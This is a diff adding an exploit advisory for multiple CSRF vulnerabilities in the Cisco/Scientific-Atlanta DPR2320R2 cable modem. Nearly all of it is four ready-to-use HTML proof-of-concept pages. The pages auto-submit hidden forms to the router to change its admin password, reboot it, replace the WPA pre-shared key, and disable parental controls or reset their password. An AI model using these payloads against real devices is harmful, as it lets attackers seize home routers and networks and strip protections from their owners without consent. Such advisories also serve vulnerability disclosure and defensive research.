@@ -1,0 +1,110 @@
+###########################################################
+[~] Exploit Title:  DPR2320R2 [Scientific-Atlanta, Inc.(A Cisco COMPANY)]
+:: Multiple CSRF vulnerability
+[~] Author: sajith
+[~]Category: Hardware/Wireless Router
+[~] vendor home page:
+http://www.cisco.com/web/consumer/support/modem_DPR2320.html
+[~] Software Version: v2.0.2r1262-090417
+
+###########################################################
+
+(1) Attacker can change the modem authentication password using CSRF
+vulnerability .check the below POC
+
+<html lang="en">
+<head>
+<title>POC by sajith shetty</title>
+</head>
+<body>
+<form action="http://192.168.0.1/goform/RgSecurity" id="formid"
+method="post">
+<input type="hidden" name="Password" value="123456" />
+<input type="hidden" name="PasswordReEnter" value="123456" />
+</form>
+<script>
+document.getElementById('formid').submit();
+</script>
+</body>
+</html>
+
+
+(2)Attacker can reboot modem using CSRF vulnerability(check below POC)
+
+
+<html lang="en">
+<head>
+<title>POC by sajith shetty</title>
+</head>
+<body>
+<form action="http://192.168.0.1/goform/restart" id="formid" method="post">
+<input type="hidden" name="Restart" value="" />
+</form>
+<script>
+document.getElementById('formid').submit();
+</script>
+</body>
+</html>
+
+
+
+
+(3)wireless settings can be exploited using CSRF vulnerability.below POC
+shows how password is changed for n/w
+
+authentication WPA-PSK with WPA-encryption set to TKIP(these setting can
+also be changed)
+
+
+<html lang="en">
+<head>
+<title>POC by sajith shetty</title>
+</head>
+<body>
+<form action="https://192.168.0.1/goform/wlanSecurity" id="formid"
+method="post">
+<input type="hidden" name="NetworkAuthentication" value="3" />
+<input type="hidden" name="WpaEncryption" value="1" />
+<input type="hidden" name="WpaPreSharedKey" value="12345678" />
+<input type="hidden" name="WpaRekeyInterval" value="0" />
+<input type="hidden" name="GenerateWepKeys" value="0" />
+<input type="hidden" name="WepKeysGenerated" value="0" />
+<input type="hidden" name="commitwlanSecurity" value="1" />
+</form>
+<script>
+document.getElementById('formid').submit();
+</script>
+</body>
+</html>
+
+
+(4)Parental control set up can be disabled or password set for parental set
+up can be changed by CSRF vulnerability[POC shown below]
+
+
+<html lang="en">
+<head>
+<title>POC by sajith shetty</title>
+</head>
+<body>
+<form action="http://192.168.0.1/goform/RgParentalBasic" id="formid"
+method="post">
+<input type="hidden" name="NewContentRule" value="" />
+<input type="hidden" name="AddContentRule" value="0" />
+<input type="hidden" name="ContentRules" value="0" />
+<input type="hidden" name="RemoveContentRule" value="0" />
+<input type="hidden" name="NewKeyword" value="" />
+<input type="hidden" name="KeywordAction" value="0" />
+<input type="hidden" name="NewDomain" value="" />
+<input type="hidden" name="DomainAction" value="0" />
+<input type="hidden" name="NewAllowedDomain" value="" />
+<input type="hidden" name="AllowedDomainAction" value="0" />
+<input type="hidden" name="ParentalPassword" value="1234" />
+<input type="hidden" name="ParentalPasswordReEnter" value="1234" />
+<input type="hidden" name="AccessDuration" value="30" />
+</form>
+<script>
+document.getElementById('formid').submit();
+</script>
+</body>
+</html>
